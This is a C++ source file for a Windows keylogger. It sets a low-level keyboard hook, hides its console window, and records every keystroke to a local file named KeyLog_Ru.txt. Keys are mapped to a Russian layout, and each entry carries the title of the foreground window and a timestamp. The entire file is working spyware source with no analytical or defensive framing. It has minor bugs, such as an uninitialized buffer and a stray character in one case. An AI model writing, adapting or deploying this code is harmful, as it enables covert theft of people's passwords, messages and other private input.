#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <iostream>
#include <windows.h>
#include <time.h>
#include <tchar.h>

using namespace std;
bool is_capslock = false;
ofstream file;

int Proverka(int key)
{
    char Prochloe[256];

    if (key == 1 || key == 2)
    {
        return 0;
    }

    HWND Okno = GetForegroundWindow();

    long int ID;
    HKL KB;

    if (Okno)
    {
        ID = GetWindowThreadProcessId(Okno, NULL);
        KB = GetKeyboardLayout(ID);

        char Name[128];

        GetWindowText(Okno, Name, 128);

        if (strcmp(Name, Prochloe) != 0)
        {
            strcpy(Prochloe, Name);

            time_t t = time(NULL);

            struct tm *tm = localtime(&t);

            char Time[64];

            strftime(Time, sizeof(Time), "%c", tm);

            file << "\n[ " << Name << "] Время: " << Time << ": ";
        }

        cout << key << endl;
    }

        switch (key)
        {

    case 112:
        file << "[F1]";
        break;
    case 113:
        file << " [F2]";
        break;
    case 114:
        file << " [F3]";
        break;
    case 115:
        file << " [F4]";
        break;
    case 116:
        file << " [F5]";
        break;
    case 117:
        file << " [F6]";
        break;
    case 118:
        file << " [F7]";
        break;
    case 119:
        file << " [F8]";
        break;
    case 120:
        file << " [F9]";
        break;
    case 121:
        file << " [F10]";
        break;
    case 122:
        file << " [F11]";
        break;
    case 123:
        file << " [F12]";
        break;
    case 96:
        file << "0";
        break;
    case 97:
        file << "1";
        break;
    case 98:
        file << "2";
        break;
    case 99:
        file << "3";
        break;
    case 100:
        file << "4";
        break;
    case 101:
        file << "5";
        break;
    case 102:
        file << "6";
        break;
    case 103:
        file << "7";
        break;
    case 104:
        file << "8";
        break;
    case 105:
        file << "9";
        break;
    case 48:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << ")";
        }
        else
            file << "0";
        break;
    case 49:
        file << 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "!";
        }
        else
            file << "1";
        break;
    case 50:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "@";
        }
        else
            file << "2";
        break;
    case 51:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "#";
        }
        else
            file << "3";
        break;
    case 52:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "$";
        }
        else
            file << "4";
        break;
    case 53:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "%";
        }
        else
            file << "5";
        break;
    case 54:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "^";
        }
        else
            file << "6";
        break;
    case 55:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "&";
        }
        else
            file << "7";
        break;
    case 56:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "*";
        }
        else
            file << "8";
        break;
    case 57:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "(";
        }
        else
            file << "9";
        break;
    case 189:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "_";
        }
        else
            file << "-";
        break;
    case 187:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "+";
        }
        else
            file << "=";
        break;
    case 65:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Ф";
            break;
        }
        else
            file << "ф";
        break;
    case 66:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "И";
        }
        else
            file << "и";
        break;
    case 67:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "С";
            break;
        }
        else
            file << "с";
        break;
    case 68:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "В";
        }
        else
            file << "в";
        break;
    case 69:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "У";
            break;
        }
        else
            file << "у";
        break;
    case 70:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "А";
        }
        else
            file << "а";
        break;
    case 71:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "П";
        }
        else
            file << "п";
        break;
    case 72:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Р";
        }
        else
            file << "р";
        break;
    case 73:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Ш";
        }
        else
            file << "ш";
        break;
    case 74:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "О";
        }
        else
            file << "о";
        break;
    case 75:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Л";
        }
        else
            file << "л";
        break;
    case 76:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Д";
            break;
        }
        else
            file << "д";
        break;
    case 77:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Ь";
        }
        else
            file << "ь";
        break;
    case 78:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Т";
            break;
        }
        else
            file << "т";
        break;
    case 79:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Щ";
            break;
        }
        else
            file << "щ";
        break;
    case 80:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "З";
            break;
        }
        else
            file << "з";
        break;
    case 81:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
        {
            file << "Й";
            break;
        }
        else
            file << "й";

        break;

    case 82:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "К";
            break;
        }
        else
            file << "к";
        break;
    case 83:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Ы";
            break;
        }
        else
            file << "ы";
        break;
    case 84:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Е";
            break;
        }
        else
            file << "е";
        break;
    case 85:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Г";
            break;
        }
            else
            file << "г";
        break;
    case 86:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "М";
            break;
        }
        else
            file << "м";
        break;
    case 87:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Ц";
            break;
        }
        else
            file << "ц";
        break;
    case 88:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Ч";
            break;
        }
        else
            file << "ч";
        break;
    case 89:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Н";
            break;
        }
        else
            file << "н";
        break;
    case 90:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Я";
            break;
            }
            else
            file << "я";
        break;
    case 186:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Ж";
            break;
        }
        else
            file << "ж";
        break;
    case 188:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Б";
            break;
        }
        else
            file << "б";
        break;
    case 190:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Ю";
            break;
        }
        else
            file << "ю";
        break;
    case 219:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Х";
            break;
        }
        else
            file << "х";
        break;
    case 221:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Ъ";
            break;
        }
        else
            file << "ъ";
        break;
    case 220:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "/";
            break;
        }
        else
            file << (char)92; //При вводt "\" компилятор ахуел
            break;
    case 222:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << '"';
            break;
        }
        else
            file << "'";
        break;
    case 191:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << ",";
            break;
        }
        else
            file << ".";
        break;
    case 192:
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            file << "Ё";
            break;
        }
        else
            file << "ё";
        break;
    case 13:
        file << "\n";
        break;
    case 20:
        if (is_capslock == false) {
            is_capslock = true;
            file << " [CapsLock] ";
        }
        else {
            is_capslock = false;
            file << " [/CapsLock] ";
        }
        break;
    case VK_BACK:
        file << "<-";
        break;
    case VK_SPACE:
        file << " ";
        break;
    case VK_MULTIPLY:
        file << "*";
        break;
    case VK_ADD:
        file << "+";
        break;
    case VK_SUBTRACT:
        file << "-";
        break;
    case VK_DECIMAL:
        file << ".";
        break;
    case VK_DIVIDE:
        file << "/";
        break;
    default:
        break;

        }
    file.flush();
    return 0;
}

HHOOK hook;
KBDLLHOOKSTRUCT kbStruct;
LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN)
        {
            kbStruct = *((KBDLLHOOKSTRUCT*)lParam);

            Proverka(kbStruct.vkCode);
        }
    }

    return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main()
{
    file.open("KeyLog_Ru.txt", ios_base::app);

    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);

    if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallBack, NULL, 0)))
    {
        MessageBox(NULL, "Problemi s hookom!", "ERROR", MB_ICONERROR);
    }

    MSG message;
    while (true)
    {
        GetMessage(&message, NULL, 0, 0);
    }
}
